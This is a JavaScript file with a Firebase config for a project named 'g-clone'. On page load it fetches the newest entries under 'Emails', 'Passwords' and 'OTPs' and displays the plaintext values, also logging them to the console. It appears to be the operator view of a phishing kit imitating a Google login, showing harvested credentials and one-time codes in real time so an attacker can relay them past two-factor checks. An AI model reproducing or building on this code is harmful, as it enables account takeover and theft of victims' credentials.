import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
import { getDatabase, ref, get, query, orderByChild, limitToLast } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyDzJSKTgfUFKZ3GLFP5rIprrNkY77lq7FA",
    authDomain: "g-clone-f53db.firebaseapp.com",
    databaseURL: "https://g-clone-f53db-default-rtdb.firebaseio.com",
    projectId: "g-clone-f53db",
    storageBucket: "g-clone-f53db.appspot.com",
    messagingSenderId: "567090264097",
    appId: "1:567090264097:web:31d4e3c99fcba6dc624b60",
    measurementId: "G-YBG1228CM5"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

function displayRecentEmail() {
    const emailsRef = ref(database, 'Emails/');
    const recentEmailQuery = query(emailsRef, orderByChild('timestamp'), limitToLast(1));

    get(recentEmailQuery).then((snapshot) => {
        console.log("Snapshot for emails:", snapshot.val()); // Debugging
        if (snapshot.exists()) {
            const data = snapshot.val();
            const lastEmailKey = Object.keys(data)[0];
            const lastEmailData = data[lastEmailKey];

            const emailElement = document.getElementById("email");

            if (emailElement) {
                emailElement.innerText = `${lastEmailData.email}`;
                console.log("Displayed recent email:", lastEmailData.email);
            } else {
                console.error("emailElement not found");
            }
        } else {
            console.log("No emails found.");
        }
    }).catch((error) => {
        console.error("Error retrieving recent email: ", error);
    });
}

function displayRecentPassword() {
    const passwordsRef = ref(database, 'Passwords/');
    const recentPasswordQuery = query(passwordsRef, orderByChild('timestamp'), limitToLast(1));

    get(recentPasswordQuery).then((snapshot) => {
        console.log("Snapshot for passwords:", snapshot.val()); // Debugging
        if (snapshot.exists()) {
            const data = snapshot.val();
            const lastPasswordKey = Object.keys(data)[0];
            const lastPasswordData = data[lastPasswordKey];

            const passwordElement = document.getElementById("password");

            if (passwordElement) {
                passwordElement.innerText = `${lastPasswordData.password}`;
                console.log("Displayed recent password:", lastPasswordData.password);
            } else {
                console.error("passwordElement not found");
            }
        } else {
            console.log("No passwords found.");
        }
    }).catch((error) => {
        console.error("Error retrieving recent password: ", error);
    });
}

function displayRecentOTP() {
    const otpsRef = ref(database, 'OTPs/');
    const recentOtpQuery = query(otpsRef, orderByChild('timestamp'), limitToLast(1));

    get(recentOtpQuery).then((snapshot) => {
        console.log("Snapshot for OTPs:", snapshot.val()); // Debugging
        if (snapshot.exists()) {
            const data = snapshot.val();
            const lastOtpKey = Object.keys(data)[0];
            const lastOtpData = data[lastOtpKey];

            const otpElements = document.getElementsByClassName("otpValue");

            if (otpElements.length > 0) {
                // Display OTP in all elements with the class "otpValue"
                Array.from(otpElements).forEach((element) => {
                    element.innerText = `${lastOtpData.value}`;
                });
                console.log("Displayed recent OTP:", lastOtpData.value);
            } else {
                console.error("otpElements not found");
            }
        } else {
            console.log("No OTPs found.");
        }
    }).catch((error) => {
        console.error("Error retrieving recent OTP: ", error);
    });
}

document.addEventListener("DOMContentLoaded", () => {
    console.log("Document loaded and script running.");

    displayRecentEmail();
    displayRecentPassword();
    displayRecentOTP();
});